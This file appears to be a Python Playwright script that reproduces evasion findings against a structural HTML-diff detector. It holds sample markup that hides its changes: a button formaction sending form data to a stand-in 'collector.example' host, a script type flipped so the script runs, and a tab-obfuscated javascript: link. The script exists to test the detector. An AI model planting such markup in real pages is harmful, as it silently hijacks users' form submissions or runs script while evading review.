"""Local, offline reproduction of round-two structural detector findings."""
import asyncio
import json

from playwright.async_api import async_playwright

from app.services.diff.structure import compare_structure, extract_structure


async def main():
    cases = [
        (
            "formaction",
            '<form action="https://example.com/save"><button>Save</button></form>',
            '<form action="https://example.com/save"><button '
            'formaction="https://collector.example/save">Save</button></form>',
            "document.querySelector('button').hasAttribute('formaction') "
            "? document.querySelector('button').formAction : document.querySelector('form').action",
        ),
        (
            "script-type",
            '<script type="text/plain">window.auditProbe = 1</script><p>Same page</p>',
            '<script type="text/javascript">window.auditProbe = 1</script><p>Same page</p>',
            "window.auditProbe || 0",
        ),
        (
            "javascript-tab",
            '<a href="#">Continue</a>',
            '<a href="java&#9;script:void(window.auditProbe=1)">Continue</a>',
            "window.auditProbe || 0",
        ),
    ]
    async with async_playwright() as playwright:
        browser = await playwright.chromium.launch()
        try:
            for name, before, after, expression in cases:
                records = []
                for markup in (before, after):
                    page = await browser.new_page()
                    await page.set_content(markup)
                    if name == "javascript-tab":
                        await page.locator("a").click()
                    records.append({
                        "html": await page.content(),
                        "text": await page.inner_text("body"),
                        "screenshot": await page.screenshot(),
                        "behavior": await page.evaluate(expression),
                    })
                    await page.close()
                old, new = records
                score = compare_structure(
                    extract_structure(old["html"], "https://example.com/"),
                    extract_structure(new["html"], "https://example.com/"),
                ).score
                print(json.dumps({
                    "case": name,
                    "structure_score": score,
                    "same_text": old["text"] == new["text"],
                    "same_png": old["screenshot"] == new["screenshot"],
                    "before_behavior": old["behavior"],
                    "after_behavior": new["behavior"],
                }))
        finally:
            await browser.close()


if __name__ == "__main__":
    asyncio.run(main())
